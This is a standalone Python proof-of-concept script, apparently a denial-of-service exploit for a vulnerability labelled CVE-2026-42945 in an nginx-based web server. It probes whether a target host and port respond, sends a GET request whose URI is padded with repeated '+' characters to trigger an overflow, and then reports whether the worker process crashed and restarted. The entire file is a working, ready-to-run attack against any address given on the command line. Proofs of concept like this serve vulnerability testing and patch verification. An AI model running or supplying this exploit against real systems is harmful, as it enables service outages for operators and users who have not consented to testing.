#!/usr/bin/env python3
"""
poc/dos_minimal.py — Standalone DoS PoC for CVE-2026-42945 (rheodev style).

Usage:
  python poc/dos_minimal.py 127.0.0.1 19321 [overflow_size]
"""
import socket
import sys
import time

DEFAULT_PORT = 19321
OVERFLOW_SIZE = 200


def server_alive(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
        d = s.recv(64)
        s.close()
        return bool(d) and d.startswith(b"HTTP/1.")
    except OSError:
        return False


def dos(host: str, port: int, overflow_size: int = OVERFLOW_SIZE):
    alive_before = server_alive(host, port)
    print(f"[*] Target {host}:{port}  alive_before={alive_before}")
    if not alive_before:
        print("[-] Target not reachable — aborting")
        return

    uri = b"+" * (overflow_size // 2)
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.sendall(
            b"GET /api/" + uri +
            b" HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n"
        )
        resp = s.recv(256)
        crashed = b"502" in resp or b"500" in resp
        s.close()
    except OSError:
        crashed = True

    print(f"[*] Overflow sent  crashed={crashed}")
    time.sleep(2)
    alive_after = server_alive(host, port)
    print(f"[*] alive_after={alive_after}")

    if crashed and alive_after:
        print("[+] VULNERABLE — worker crashed and respawned (auto-restart active)")
    elif crashed and not alive_after:
        print("[!] Worker crashed but did NOT respawn — likely nginx master stopped")
    else:
        print("[*] No crash detected")


if __name__ == "__main__":
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        sys.exit(1)
    host = args[0]
    port = int(args[1]) if len(args) > 1 else DEFAULT_PORT
    size = int(args[2]) if len(args) > 2 else OVERFLOW_SIZE
    dos(host, port, size)
